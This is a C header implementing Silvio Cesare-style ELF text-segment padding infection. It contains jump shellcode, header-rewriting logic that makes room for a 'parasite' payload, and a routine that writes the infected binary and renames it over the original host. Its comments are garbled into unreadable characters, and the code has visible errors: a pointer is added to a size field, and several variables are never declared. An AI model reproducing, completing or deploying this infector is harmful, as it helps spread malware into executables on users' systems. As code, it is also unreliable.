#ifndef __SILVIO_H__
#define __SILVIO_H__
#define JMP_PATCH_OFFSET 1 //how many bytes into the shellcode do we patch
/**
  * movl $addr, %eax;
  * jmp *eax;
  */
char parasite_shellcode[] = "\xb8\x00\x00\x00\x00"
							"\xff\xe0";

#define TMP "/TMP/.infected"

/**
 * 
 *  �������
 *
 *  note: jmp_code_offset contains the offset into the payload
 *  shellcode that has the branch instruction to patch with the
 *  original offset so control flow can be transferred back to
 *  the host.
 *
 * @author chris (2019/11/15)
 * 
 * @param hosts_name 
 * @param psize 
 * @param hsize 
 * @param mem 
 * @param end_of_text 
 * @param parasite 
 * @param jmp_code_offset 
 */
void insert_parasite(char *hosts_name, size_t psize, size_t hsize, uint8_t *mem, size_t end_of_text,
	 uint8_t *parasite, uint32_t jmp_code_offset) {
	int ofd;
	unsigned int c;
	int i,t = 0;
	ofd=open(TMP, O_CREAT | O_WRONLY | O_TRUNC, S_IRUSR | S_IXUSR | S_IWUSR);
	write(ofd, mem, end_of_text);
	*(uint32_t *)&parasite[jmp_code_offset] = old_e_entry;
	write(ofd, parasite, psize);
	lseek(ofd, PAGE_SIZE - psize, SEEK_CUR);
	mem += end_of_text;
	unsigned int sum = end_of_text + PAGE_SIZE;
	unsigned int last_chunk = hsize - end_of_text;
	write(ofd, mem, last_chunk);
	rename(TMP, hosts_name);
	close(ofd);
}

/**
 * 1. ��ELF�ļ�ͷ�е�ehdr->e_shoff������PAGE_SIZE�Ĵ�Сֵ
 *2. ��λtext�ε�phdr
 *  - ����ڵ��޸�Ϊ���������λ��
 *  - `ehdr->e_entry = phdr[TEXT].p_vaddr + phdr[TEXT].p_filesz`
 *  - ��phdr[TEXT].p_filesz���Ӽ�������ĳ���ֵ
 *  - ��phdr[TEXT].p_memsz���Ӽ�������ĳ���ֵ
 * 3. ��ÿ��phdr�������Ӧ�Ķ�λ�ڼ�������֮����phdr[x].p_offset����PAGE_SIZE��С���ֽ�
 * 4. �ҵ�text�ε����һ��shdr����shdr[x].sh_size���Ӽ�������ĳ���ֵ����Ϊ��������н����ż������룩
 * 5. ��ÿ��λ�ڼ����������λ��֮���shdr����shdr[x].sh_offset����PAGE_SIZE�Ĵ�Сֵ
 * 6. �������ļ���������뵽text�ε�file_base+phdr[TEXT].p_filesz
 * 
 * @author chris (2019/11/15)
 * 
 * @param host 
 * @param base 
 * @param payload 
 * @param host_len 
 * @param parasite_len 
 * 
 * @return int 
 */
int silvio_text_infect(char *host,  void *base,  void *payload, size_t host_len, size_t parasite_len)
{
	Elf64_Addr o_entry;
	Elf64_Addr o_text_filesz;
	Elf64_Addr parasite_vaddr;
	uint64_t end_of_text;
	int found_text;

	uint8_t *mem = (uint8_t *)base;
	uint8_t *parasite = (uint8_t *)payload;

	Elf64_Ehdr *ehdr = (Elf64_Ehdr *)mem;
	Elf64_Phdr *phdr = (Elf64_Phdr *)&mem[ehdr->e_phoff];
	Elf64_Shdr *shdr = (Elf64_Shdr *)&mem[ehdr->e_shoff];

	/**
	 * Adjust program headers
	 */
	for (found_text = 0, i = 0; i < ehdr->e_phnum; i++) {
		if (phdr[i].p_type == PT_LOAD) {
			if (phdr[i].p_offset == 0) {
				/**
				 * TEXT��
				 */
				o_text_filesz = phdr[i].p_filesz;
				end_of_text = phdr[i].p_offset + phdr[i].p_filesz;
				//��������������ַ
				parasite_vaddr = phdr[i].p_vaddr + o_text_filesz;
				//TEXT�ε�p_filesz���Ӽ�������ĳ���ֵ
				phdr[i].p_filesz += parasite_len;
				//TEXT�ε�p_memsz���Ӽ�������ĳ���ֵ
				phdr[i].p_memsz += parasite;
				for (j = i + 1; j < ehdr->e_phnum; ++j) {
					/**
					 * ��ÿ��phdr�������Ӧ�Ķ�λ�ڼ�������֮����phdr[x].p_offset����PAGE_SIZE��С���ֽ�
					 */
					if (phdr[j].p_offset > phdr[i].p_offset + o_text_filesz) {
						phdr[j].p_offset += PAGE_SIZE;
					}
				}
				break;
			}
		}
	}
	/**
	 * ��ÿ��λ�ڼ����������λ��֮���shdr����shdr[x].sh_offset����PAGE_SIZE�Ĵ�Сֵ
	 */
	for (i = 0; i < ehdr->e_shnum;++i) {
		if (shdr[i].sh_addr > parasite_vaddr) {
			shdr[i].sh_offset += PAGE_SIZE;
		} else {
			//�ҵ�text�ε����һ��shdr����shdr[x].sh_size���Ӽ�������ĳ���ֵ����Ϊ��������н����ż������룩
			if (shdr[i].sh_addr + shdr[i].sh_size == parasite_vaddr) {
				shdr[i].sh_size += parasite_len;
			}
		}
	}
	
	insert_parasite(host, parasite_len, host_len, base, end_of_text, parasite, JMP_PATCH_OFFSET);
}
#endif
